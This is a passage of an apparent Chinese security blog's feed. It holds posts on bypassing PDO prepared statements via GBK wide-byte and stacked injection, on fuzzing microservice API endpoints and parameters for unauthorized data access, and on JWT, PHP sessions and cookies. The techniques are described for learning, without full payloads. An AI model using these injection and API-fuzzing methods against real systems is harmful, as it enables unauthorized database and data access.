title="02.单独开启模拟编译"></a>02.单独开启模拟编译</h3><p>要是我们关闭了多条语句查询呢，我们就可以利用联合查询加宽字节来注入吗？答案是可以的：</p><p><img src="/2020/03/24/SQL%E9%A2%84%E7%BC%96%E8%AF%91%E7%BB%95%E8%BF%87/4.png" alt></p><p>可以看到使用union进行联合注入也是可以成功注入的，根本不需要进行多句执行（即开不开开启多条查询选项都可以）。 </p><blockquote><p>结论：模板语句没有动态拼接，并且正常绑定参数。假如设置GBK编码，即使仅开启了模拟编译，也可以宽字节逃逸单引号配合联合查询来进行注入。</p></blockquote><h3 id="03-模拟编译与非模拟编译之差"><a href="#03-模拟编译与非模拟编译之差" class="headerlink" title="03.模拟编译与非模拟编译之差"></a>03.模拟编译与非模拟编译之差</h3><p>模拟编译：</p><blockquote><p>在模拟预编译的情况下，PDO对于SQL注入的防范（PDO::queto()），无非就是将数字型的注入转变为字符型的注入，又用类似mysql_real_escape_string()的方法将单引号、双引号、反斜杠等字符进行了转义。所以GBK编码下是能使用<strong>宽字节</strong>进行绕过的。 </p></blockquote><p>非模拟编译：</p><blockquote><p>它对每一句sql语句都进行了预编译和执行两个操作。在执行select balabala from table1 where 1=?这句时，如果是<strong>GBK编码</strong>，那么它将会把?绑定的参数转化成<strong>16进制</strong>，无论输入什么都无法再进行注入。</p></blockquote><p><img src="/2020/03/24/SQL%E9%A2%84%E7%BC%96%E8%AF%91%E7%BB%95%E8%BF%87/5.png" alt></p><h3 id="04-非模拟编译效果"><a href="#04-非模拟编译效果" class="headerlink" title="04.非模拟编译效果"></a>04.非模拟编译效果</h3><p>PDO的原理，与Mysql中prepare语句是一样的。上面PDO所执行的SQL语句，用如下的方式可以等效替代： </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Set</span> @x=<span class="number">0x31</span></span><br><span class="line"><span class="keyword">Prepare</span> a <span class="keyword">from</span> “<span class="keyword">select</span> balabala <span class="keyword">from</span> table1 <span class="keyword">where</span> <span class="number">1</span>=?”</span><br><span class="line"><span class="keyword">Execute</span> a <span class="keyword">using</span> @x</span><br></pre></td></tr></table></figure><blockquote><p>即PDO译原理相当于将参数设置为@x，并转换为十六进制，随后预编译并执行。</p></blockquote><p>PDO中使用非模拟编译的效果也可以通过下面代码实现：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$db = <span class="keyword">new</span> mysqli(<span class="string">'localhost'</span>,<span class="string">'root'</span>,<span class="string">''</span>,<span class="string">'pdotest'</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">$id = <span class="string">"0x"</span>.bin2hex($_GET[<span class="string">'id'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">$id=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"id:"</span>.$id.<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">$db-&gt;query(<span class="string">"set names gbk"</span>);</span><br><span class="line">$db-&gt;query(<span class="string">"set @x=&#123;$id&#125;"</span>);</span><br><span class="line">$db-&gt;query(<span class="string">"prepare a from 'select balabala from table1 where 1=?'"</span>);</span><br><span class="line">$row = $db-&gt;query(<span class="string">"execute a using @x"</span>);</span><br><span class="line">$result = $row-&gt;fetch_assoc();</span><br><span class="line"><span class="keyword">if</span>($result)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"结果为："</span>;</span><br><span class="line">print_r($result);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其运行的结果和使用PDO是一致的：</p><p><img src="/2020/03/24/SQL%E9%A2%84%E7%BC%96%E8%AF%91%E7%BB%95%E8%BF%87/6.png" alt></p><h2 id="0x03-场景小结"><a href="#0x03-场景小结" class="headerlink" title="0x03 场景小结"></a>0x03 场景小结</h2><ul><li><p>动态拼接模板语句</p><ul><li>仅开启多条查询：堆叠注入。</li><li>仅开启报错（报错语句必须是第一条）：报错注入。</li><li>开启报错和多条查询：报错注入+堆叠注入。</li></ul></li><li><p>固定模板语句并正常绑定参数</p><ul><li>仅开启模拟编译：宽字节注入。</li><li>开启模拟编译和多条查询：宽字节注入+堆叠注入。</li></ul></li><li><p>非模拟编译防御原理</p><ul><li>绑定参数为GBK编码时，将参数转为十六进制。</li></ul></li></ul><h2 id="0x04-参考链接"><a href="#0x04-参考链接" class="headerlink" title="0x04 参考链接"></a>0x04 参考链接</h2><p><a href="https://www.freebuf.com/articles/web/216336.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/216336.html</a> </p><p><a href="https://cloud.tencent.com/developer/news/388755" target="_blank" rel="noopener">https://cloud.tencent.com/developer/news/388755</a> </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;SQL预编译绕过&quot;&gt;&lt;a href=&quot;#SQL预编译绕过&quot; class=&quot;headerlink&quot; title=&quot;SQL预编译绕过&quot;&gt;&lt;/a&gt;SQL预编译绕过&lt;/h1&gt;&lt;p&gt;众所周知，预编译是用来防御SQL注入的最有效的手段之一。然而只要我们使用了预编译，就能保证万
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>微服务API利用</title>
    <link href="http://bai-ren-1.github.io/2020/03/23/%E5%BE%AE%E6%9C%8D%E5%8A%A1API%E5%88%A9%E7%94%A8/"/>
    <id>http://bai-ren-1.github.io/2020/03/23/%E5%BE%AE%E6%9C%8D%E5%8A%A1API%E5%88%A9%E7%94%A8/</id>
    <published>2020-03-23T09:31:58.000Z</published>
    <updated>2020-03-24T02:52:24.221Z</updated>
    
    <content type="html"><![CDATA[<h1 id="微服务API利用"><a href="#微服务API利用" class="headerlink" title="微服务API利用"></a>微服务API利用</h1><p><img src="/2020/03/23/%E5%BE%AE%E6%9C%8D%E5%8A%A1API%E5%88%A9%E7%94%A8/1.png" alt></p><p>上面是WEB发展的架构变化，下面我们粗略的看看每一个时期的不同的WEB架构特点。</p><h2 id="0x00-单一应用架构"><a href="#0x00-单一应用架构" class="headerlink" title="0x00 单一应用架构"></a>0x00 单一应用架构</h2><p>当网站流量很小时，只需一个应用，将<strong>所有功能</strong>都部署在一起，以减少部署节点和成本。此时，用于简化增删改查工作量的数据访问框架(ORM)是关键。</p><p><img src="/2020/03/23/%E5%BE%AE%E6%9C%8D%E5%8A%A1API%E5%88%A9%E7%94%A8/2.png" alt></p><h2 id="0x01-垂直应用架构"><a href="#0x01-垂直应用架构" class="headerlink" title="0x01 垂直应用架构"></a>0x01 垂直应用架构</h2><p>当访问量逐渐增大，单一应用增加机器带来的加速度越来越小，将应用<strong>拆成</strong>互不相干的几个应用，以提升效率。此时，用于加速前端页面开发的Web框架(MVC)是关键。</p><p><img src="/2020/03/23/%E5%BE%AE%E6%9C%8D%E5%8A%A1API%E5%88%A9%E7%94%A8/3.png" alt></p><h2 id="0x02-分布式服务架构"><a href="#0x02-分布式服务架构" class="headerlink" title="0x02 分布式服务架构"></a>0x02 分布式服务架构</h2><p>当垂直应用越来越多，应用之间交互不可避免，将核心业务抽取出来，作为独立的服务，逐渐形成稳定的服务中心，使前端应用能更快速的响应多变的市场需求。此时，用于提高业务复用及整合的分布式服务框架(RPC)是关键。</p><p><img src="/2020/03/23/%E5%BE%AE%E6%9C%8D%E5%8A%A1API%E5%88%A9%E7%94%A8/4.png" alt></p><h2 id="0x03-流动计算架构"><a href="#0x03-流动计算架构" class="headerlink" title="0x03 流动计算架构"></a>0x03 流动计算架构</h2><p>当服务越来越多，容量的评估，小服务资源的浪费等问题逐渐显现，此时需增加一个调度中心基于访问压力实时管理集群容量，提高集群利用率。此时，用于提高机器利用率的资源调度和治理中心(SOA)是关键。</p><h2 id="0x04-微服务"><a href="#0x04-微服务" class="headerlink" title="0x04 微服务"></a>0x04 微服务</h2><p>微服务架构是一种架构模式，它提倡将<strong>单一应用程序划分成一组小的服务</strong>，服务之间相互协调、互相配合，为用户提供最终价值。每个服务运行在其独立的进程中，服务和服务之间采用轻量级的通信机制相互沟通（通常是基于HTTP的Restful API)。每个服务都围绕着具体的业务进行构建，并且能够被独立的部署到生产环境、类生产环境等。另外，应尽量避免统一的、集中的服务管理机制，对具体的一个服务而言，应根据业务上下文，选择合适的语言、工具对其进行构造。</p><p><img src="/2020/03/23/%E5%BE%AE%E6%9C%8D%E5%8A%A1API%E5%88%A9%E7%94%A8/5.png" alt></p><h2 id="0x05-API下信息收集"><a href="#0x05-API下信息收集" class="headerlink" title="0x05 API下信息收集"></a>0x05 API下信息收集</h2><blockquote><p>学习了微服务的架构后，我们知道：假如API没有对请求做验证或者可以伪造认证信息，就会导致API接口直接被我们访问。然后我们可以通过FUZZ出API的接口模式（REST风格就改请求方法；其他可以尝试添加uri参数去爆破等），尝试去获取到其提供的数据。</p></blockquote><h3 id="1-微信小程序"><a href="#1-微信小程序" class="headerlink" title="1)  微信小程序"></a>1)  微信小程序</h3><p>许多和目标相关的URL我们无法通过以前的方式搜集到，那么如果目标存在微信小程序，那么我们可以尝试从微信小程序收集些信息。 <strong>微信小程序 -&gt; 更多资料</strong>。</p><h3 id="2-JS文件"><a href="#2-JS文件" class="headerlink" title="2)  JS文件"></a>2)  JS文件</h3><p>JS里面蕴藏了很多有意思的内容，除了大量的<strong>域名</strong>之外，其中最重要的莫过于<strong>目录和参数</strong>。通过JS发现的目录和参数收集起来，组成字典，通过fuzz的思想进行随机组合，会有很多惊喜的出现，出现的这些内容是以往的信息收集无法找到的 。</p><p><img src="/2020/03/23/%E5%BE%AE%E6%9C%8D%E5%8A%A1API%E5%88%A9%E7%94%A8/7.png" alt></p><blockquote><p>通过JS我们能找到很多和目标相关的信息，其中包括大量的子域名和相关的url，重要的是一些api信息。 </p></blockquote><h3 id="3-爆破参数"><a href="#3-爆破参数" class="headerlink" title="3) 爆破参数"></a>3) 爆破参数</h3><p>即使FUZZ出API的路径，但是访问后提示403是最常见的一种情况。我们猜测是缺少参数。</p><p><img src="/2020/03/23/%E5%BE%AE%E6%9C%8D%E5%8A%A1API%E5%88%A9%E7%94%A8/6.png" alt></p><p>这时候我们就可以通过收集的大量的参数进行FUZZ（以前是爆破后台等，现在是爆破参数）。如下图对参数以及其值进行爆破。当然API的命名很有规律，有时灵光一现就能直接FUZZ出他的值：</p><p><img src="/2020/03/23/%E5%BE%AE%E6%9C%8D%E5%8A%A1API%E5%88%A9%E7%94%A8/8.png" alt></p><h2 id="0x06-小结"><a href="#0x06-小结" class="headerlink" title="0x06 小结"></a>0x06 小结</h2><p>之前会被拉到这方面是因为不太理解API的概念，一知半解。在询问了研发同学加上文章后，就有了一定的认识，瞬间有了关于API方面的漏洞挖掘的思路。刚好看到freebuf上有类似的文章，就转载一下。继续努力吧！</p><p>参考链接：</p><p><a href="https://www.freebuf.com/articles/web/224605.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/224605.html</a> </p><p><a href="https://www.cnblogs.com/jsjwk/p/10769246.html" target="_blank" rel="noopener">https://www.cnblogs.com/jsjwk/p/10769246.html</a> </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;微服务API利用&quot;&gt;&lt;a href=&quot;#微服务API利用&quot; class=&quot;headerlink&quot; title=&quot;微服务API利用&quot;&gt;&lt;/a&gt;微服务API利用&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;/2020/03/23/%E5%BE%AE%E6%9C%8D%E5%8A
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>JWT</title>
    <link href="http://bai-ren-1.github.io/2020/03/23/JWT/"/>
    <id>http://bai-ren-1.github.io/2020/03/23/JWT/</id>
    <published>2020-03-23T06:35:07.000Z</published>
    <updated>2020-03-24T09:14:25.367Z</updated>
    
    <content type="html"><![CDATA[<h2 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h2><p>上面两篇博客我们使用的是基于cookie/session来进行<strong>身份认证</strong>。今天就来说一说基于token的身份认证。token中一种常用的形式就是JSON WEB TOKEN，也就是JWT。首先我们从session认证和token认证入手。</p><h2 id="0x00-基于session认证"><a href="#0x00-基于session认证" class="headerlink" title="0x00 基于session认证"></a>0x00 基于session认证</h2><blockquote><p>基于Session的认证一直处于主流地位。由于http协议是无状态的，借助cookie，客户端登陆成功后，服务端就能识别其后续请求，而不需要每次都登陆。它是<strong>有状态的</strong>，即服务端和客户端都需要保存生成的<strong>session</strong>。</p></blockquote><h3 id="基于session认证的流程"><a href="#基于session认证的流程" class="headerlink" title="基于session认证的流程"></a>基于session认证的流程</h3><ul><li>客户端登陆，一般输入用户名和密码。</li><li>服务端如果验证通过，就会生成session，并把它存入数据库中。</li><li>客户端在浏览器上会产生cookie，并把sessionID写入。</li><li>客户端后续有新的请求，都会在请求后携带sessIonID，发给服务端。</li><li>如果客户端登陆出去，该生成的session就会在客户端和服务端都被销毁。</li></ul><h3 id="基于session认证的缺点"><a href="#基于session认证的缺点" class="headerlink" title="基于session认证的缺点"></a>基于session认证的缺点</h3><ul><li><p>Session: </p><p>每个用户经过我们的应用认证之后，我们的应用都要在服务端做一次记录，以方便用户下次请求的鉴别，通常而言session都是保存在内存中，而随着认证用户的增多，服务端的开销会明显增大。</p></li><li><p>扩展性: </p><p>用户认证之后，服务端做认证记录，如果认证的记录被保存在内存中的话，这意味着用户下次请求还必须要请求在这台服务器上,这样才能拿到授权的资源，这样在分布式的应用上，相应的限制了负载均衡器的能力。这也意味着限制了应用的扩展能力。</p></li><li><p>CSRF攻击</p><p>因为是基于cookie来进行用户识别的, cookie如果被截获，用户就会很容易受到跨站请求伪造的攻击。</p></li></ul><h2 id="0x01-基于token认证"><a href="#0x01-基于token认证" class="headerlink" title="0x01 基于token认证"></a>0x01 基于token认证</h2><blockquote><p>近年来，基于token的认证开始成为主流。该认证方式是<strong>无状态的</strong>，客户端登陆成功后，服务端会生成一个token并把它返还给客户端。由于是无状态的，服务端<strong>不再保存该Token</strong>。 </p></blockquote><h3 id="基于token认证的流程"><a href="#基于token认证的流程" class="headerlink" title="基于token认证的流程"></a>基于token认证的流程</h3><ul><li><p>客户端用自己的机密信息登陆，如用户名和密码</p></li><li><p>服务端验证，验证通过，生成Token返还给客户端。</p></li><li><p>客户端把Token写入local storage，后续请求都携带该Token（token一般都是写入客户端的local storage，不过也可以保存在其他地方）。</p></li><li><p>服务端收到请求时验证Token，如果验证通过，则允许用户访问相应资源。</p></li></ul><h3 id="基于token认证的缺点"><a href="#基于token认证的缺点" class="headerlink" title="基于token认证的缺点"></a>基于token认证的缺点</h3><ul><li>因要服务端给Tooken设置过期时间，不能太长，太长可能被冒用不安全。</li><li>过期时间太短用户体验差。</li></ul><h2 id="0x02-JWT"><a href="#0x02-JWT" class="headerlink" title="0x02 JWT"></a>0x02 JWT</h2><p>JWT是由三段信息构成的，将这三段信息文本用<code>.</code>链接一起就构成了Jwt字符串。就像这样:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</span><span class="selector-class">.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9</span><span class="selector-class">.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ</span></span><br></pre></td></tr></table></figure><p>第一部分我们称它为头部（header），第二部分我们称其为载荷（payload, 类似于飞机上承载的物品），第三部分是签证（signature）。</p><h4 id="1-header"><a href="#1-header" class="headerlink" title="1. header"></a>1. header</h4><p>jwt的头部承载两部分信息：</p><ul><li>声明类型，这里是jwt</li><li>声明加密的算法 通常直接使用 HMAC SHA256</li></ul><p>完整的头部就像下面这样的JSON：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">'typ'</span>: <span class="string">'JWT'</span>,</span><br><span class="line">  <span class="string">'alg'</span>: <span class="string">'HS256'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后将头部进行base64加密（该加密是可以对称解密的),构成了第一部分：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9</span><br></pre></td></tr></table></figure><h4 id="2-playload"><a href="#2-playload" class="headerlink" title="2. playload"></a>2. playload</h4><p>载荷就是存放有效信息的地方。这个名字像是特指飞机上承载的货品，这些有效信息包含三个部分</p><ul><li>标准中注册的声明</li><li>公共的声明</li><li>私有的声明</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"sub"</span>: <span class="string">"1234567890"</span>,</span><br><span class="line">  <span class="attr">"name"</span>: <span class="string">"John Doe"</span>,</span><br><span class="line">  <span class="attr">"admin"</span>: <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后将其进行base64加密，得到Jwt的第二部分。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9</span><br></pre></td></tr></table></figure><h4 id="3-signature"><a href="#3-signature" class="headerlink" title="3.signature"></a>3.signature</h4><p>jwt的第三部分是一个签证信息，这个签证信息由三部分组成：</p><ul><li>header (base64后的)</li><li>payload (base64后的)</li><li>secret</li></ul><p>这个部分需要base64加密后的header和base64加密后的payload使用<code>.</code>连接组成的字符串，然后通过header中声明的加密方式进行加盐<code>secret</code>组合加密，然后就构成了jwt的第三部分。</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// javascript</span></span><br><span class="line"><span class="keyword">var</span> encodedString = base64UrlEncode(header) + <span class="string">'.'</span> + base64UrlEncode(payload);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> signature = HMACSHA256(encodedString, <span class="string">'secret'</span>); <span class="comment">// TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ</span></span><br></pre></td></tr></table></figure><p>将这三部分用<code>.</code>连接成一个完整的字符串,构成了最终的jwt:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</span><span class="selector-class">.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9</span><span class="selector-class">.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ</span></span><br></pre></td></tr></table></figure><blockquote><p>secret是保存在服务器端的，jwt的签发生成也是在服务器端的，secret就是用来进行jwt的签发和jwt的验证，所以，它就是你服务端的私钥，在任何场景都不应该流露出去。一旦客户端得知这个secret, 那就意味着客户端是可以自我签发jwt了。</p></blockquote><h2 id="0x03-小结"><a href="#0x03-小结" class="headerlink" title="0x03 小结"></a>0x03 小结</h2><p>这里简单做一下关于这几篇博客的小结：</p><ul><li>基于cookie/session的是身份认证方式。</li><li>基于token的也是身份认证方式。</li><li>JWT是基于token身份认证的一种具体形式。</li></ul><h2 id="0x04-参考连接"><a href="#0x04-参考连接" class="headerlink" title="0x04 参考连接"></a>0x04 参考连接</h2><p><a href="https://www.jianshu.com/p/576dbf44b2ae" target="_blank" rel="noopener">https://www.jianshu.com/p/576dbf44b2ae</a> </p><p><a href="https://www.cnblogs.com/xiangkejin/p/9011119.html" target="_blank" rel="noopener">https://www.cnblogs.com/xiangkejin/p/9011119.html</a> </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;JWT&quot;&gt;&lt;a href=&quot;#JWT&quot; class=&quot;headerlink&quot; title=&quot;JWT&quot;&gt;&lt;/a&gt;JWT&lt;/h2&gt;&lt;p&gt;上面两篇博客我们使用的是基于cookie/session来进行&lt;strong&gt;身份认证&lt;/strong&gt;。今天就来说一说基于toke
      
    
    </summary>
    
    
      <category term="计算机基础" scheme="http://bai-ren-1.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"/>
    
    
  </entry>
  
  <entry>
    <title>Session</title>
    <link href="http://bai-ren-1.github.io/2020/03/22/Session/"/>
    <id>http://bai-ren-1.github.io/2020/03/22/Session/</id>
    <published>2020-03-22T03:54:08.000Z</published>
    <updated>2020-03-22T06:37:34.527Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Session"><a href="#Session" class="headerlink" title="Session"></a>Session</h1><p>作为上一篇的兄弟篇，这一篇主要说明服务端对于用户标识的做法。session的具体用法和参数，这里我就详细的记录下来。</p><h2 id="0x00-初探Session"><a href="#0x00-初探Session" class="headerlink" title="0x00 初探Session"></a>0x00 初探Session</h2><p>在php中，我们可以通过phpinfo获取到session保存的位置：</p><p><img src="/2020/03/22/Session/1.png" alt></p><p>可以看出php服务端在开启会话后，会发送一个名字为PHPSESSID的session标识给我们客户端，用于作为“钥匙”获取服务端的数据。然后我们可以看到服务端通过文件形式将session保存在tmp路径下。我新建一个1.php用于开启一个会话：</p><p><img src="/2020/03/22/Session/2.png" alt></p><p>1.php下通过session_start开启一个session，然后我们通过浏览器对其进行访问，看session保存路径下是否会生成新的session文件。可见原先我们该路径下的文件夹是空的：</p><p><img src="/2020/03/22/Session/Session%5C3.png" alt></p><p>然后我们访问localhost/1.php，在cookie字段下面多了一个名为PHPSESSID的键：</p><p><img src="/2020/03/22/Session/4.png" alt></p><p>然后我们到session路径下查看，就能发现在该路径下确实生成了一个session文件，其名称包含了cookie下的对应的键值：</p><p><img src="/2020/03/22/Session/5.png" alt></p><blockquote><p>服务端通过客户端的浏览器标识客户，所以即使同一台客户端主机，开启不同的浏览器访问会获得不同的session。</p></blockquote><p>综上所述，当服务端php使用session_start开启了一个会话后，就会给访这个页面的浏览器发布一个</p><p>sessionid存放在客户端cookie内，其键名为PHPSESSID。</p><p>我们有了存放在服务端的session文件，那客户端是怎么通过PHPSESSID获取到里面的内容的呢？</p><p><img src="/2020/03/22/Session/6.png" alt></p><p>我们首先刷新请求，可以看到请求头里带上了cookie字段。服务器接收到cookie的数据后，就会打开对应的session文件并返回给客户端。这个的具体演示就看下一章的实验。</p><h2 id="0x01-Session内容"><a href="#0x01-Session内容" class="headerlink" title="0x01 Session内容"></a>0x01 Session内容</h2><p>把1.php的源码修改为给超全局数组$_SESSION中写入一个键值并打印数组内容：</p><p><img src="/2020/03/22/Session/8.png" alt></p><p>我们重新刷新页面，可以看到$_SESSION数组的值被打印出来：</p><p><img src="/2020/03/22/Session/7.png" alt></p><p>我们得看看存储在服务端的session的文件是什么形式存储数据的呢？</p><p><img src="/2020/03/22/Session/9.png" alt></p><p>可见在服务端的session文件里存储了序列化形式数据。</p><blockquote><p>综上，当客户端第一次访问到服务端该页面时，服务端会执行session_start启动一个session。执行后服务器会在保存路径下生成一个空的session用于保存数据，并且在给客户端返回一个PHPSESSID保存在cookie中（好像sessonid不一定是保留客户端的cookie中，也可以是其他地方）。然后程序继续执行，往$_SESSION数组中里面写入值，服务端会自动取出里面内容并用序列化的形式保存至对应的会话文件中。然后只要客户端带着这个PHPSESSID来访问服务端，服务端就会给其返回对应的session文件对应的内容。</p></blockquote><h2 id="0x02-共享Session"><a href="#0x02-共享Session" class="headerlink" title="0x02 共享Session"></a>0x02 共享Session</h2><p>我想在另一个文件里面也使用这个session，该怎么操作？新建2.php，内容如下：</p><p><img src="/2020/03/22/Session/10.png" alt></p><p>然后我带着刚刚的PHPSESSID访问2.php：</p><p><img src="/2020/03/22/Session/11.png" alt></p><p>session文件里面会多了一条序列化数据：</p><p><img src="/2020/03/22/Session/12.png" alt></p><blockquote><p>在另一个文件中使用session_start开启会话，如果请求头中cookie带有PHPSESSID，就不会生成新的session文件，而是会找到ID对应的文件并进行操作，达成不同文件共享会话session的目的。</p></blockquote><h2 id="0x03-删除Session"><a href="#0x03-删除Session" class="headerlink" title="0x03 删除Session"></a>0x03 删除Session</h2><p>然后我们可以通过unset属性或者直接将session设置为空来清空session。首先修改2.php，我们给他赋值age属性后立马将session里面的name属性删除：</p><p><img src="/2020/03/22/Session/13.png" alt></p><p>清除之前实验的session重新开始，我们访问1.php查看结果，和之前实验一样生成了session文件并写入了name属性：</p><p><img src="/2020/03/22/Session/14.png" alt></p><p>然后我们再访问2.php看结果如何？由下图的结果我们可以分析出，访问2.php后在同一个session下写入age属性并打印出结果。在浏览器上我们能看到两个属性：</p><p><img src="/2020/03/22/Session/15.png" alt></p><p>那2.php执行完后的session文件中的属性是什么样的呢？如我们所料，原来的session中的name属性被我们删除了。现在session文件里面只剩下了age属性。</p><p><img src="/2020/03/22/Session/16.png" alt></p><p>然后我们在做最后一步验证，看访问1.php会打印出什么内容：</p><p><img src="/2020/03/22/Session/17.png" alt></p><p>因为1.php的执行流程是重新写入name属性再打印出结果，由键值顺序我们就能看出。刚刚的删除操作是成功执行了。</p><blockquote><p>综上，两个不同文件都是用使用session_start就能使用同一个会话。当我们需要删除会话属性时，可以使用unset或者直接赋值$_SESSION为空来做到。</p></blockquote><h2 id="0x04-Session-amp-Cookie"><a href="#0x04-Session-amp-Cookie" class="headerlink" title="0x04 Session&amp;Cookie"></a>0x04 Session&amp;Cookie</h2><p>当然下面的结论是使用setcookie和session_start得到的，其他语言或者其他函数我就这里就不继续做了。</p><ul><li><p><strong>cookie</strong>是服务端通过setcookie直接给客户端的cookie字段中加入了的标识用户的数据，即<strong>标识用户的数据存储在客户端中</strong>。</p></li><li><p><strong>session</strong>是服务端通过session_start给客户端cookie字段（也可能是客户端其他地方）中加入了获取标识用户数据的“钥匙”即sessionid，客户端通过这把钥匙才能在服务端上对应的session文件上获得用户的数据。<strong>即标识用户的数据存在了服务端，但用户需要sessionid这把本地“钥匙”才能进行获取</strong>。</p></li></ul><h2 id="0x05-小结"><a href="#0x05-小结" class="headerlink" title="0x05 小结"></a>0x05 小结</h2><p>session和cookie的博客就先写到这里。后面看看把tokn给补充上来，完成三杀。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Session&quot;&gt;&lt;a href=&quot;#Session&quot; class=&quot;headerlink&quot; title=&quot;Session&quot;&gt;&lt;/a&gt;Session&lt;/h1&gt;&lt;p&gt;作为上一篇的兄弟篇，这一篇主要说明服务端对于用户标识的做法。session的具体用法和参数，这里我就
      
    
    </summary>
    
    
      <category term="计算机基础" scheme="http://bai-ren-1.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"/>
    
    
  </entry>
  
  <entry>
    <title>Cookie</title>
    <link href="http://bai-ren-1.github.io/2020/03/22/Cookie/"/>
    <id>http://bai-ren-1.github.io/2020/03/22/Cookie/</id>
    <published>2020-03-22T03:07:49.000Z</published>
    <updated>2020-03-22T06:23:53.539Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h1><p>拿php做一个简单的实验，分析cookie的各个选项的作用并加深理解。</p><h2 id="0x00-修改hosts"><a href="#0x00-修改hosts" class="headerlink" title="0x00 修改hosts"></a>0x00 修改hosts</h2><ul><li>hosts作用：就是将一些常用的网址域名与其对应的IP地址建立一个关联。</li><li>hosts文件路径：C:\windows\system32\drivers\etc\hosts 。</li></ul><p><img src="/2020/03/22/Cookie/1.png" alt></p><p>这里我设置两个shabi.com的子域，都指向了同一个地址（为了区分cookie作用域选项）。然后我们开启wampserver，就可以开始实验了。</p><h2 id="0x01-设置cookie"><a href="#0x01-设置cookie" class="headerlink" title="0x01 设置cookie"></a>0x01 设置cookie</h2><p>我们的主文件1.php通过setcookie进行cookie的设置，而同目录下的2.php是通过print_r($_COOKIE)使用超全局变量数组将cookie打印出来：</p><p><img src="/2020/03/22/Cookie/2.png" alt></p><p>其中setcookie中的每个选项的作用如下图所示：</p><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">name</td><td align="left">必需。规定 cookie 的名称。</td></tr><tr><td align="left">value</td><td align="left">必需。规定 cookie 的值。</td></tr><tr><td align="left">expire</td><td align="left">可选。规定 cookie 的有效期。</td></tr><tr><td 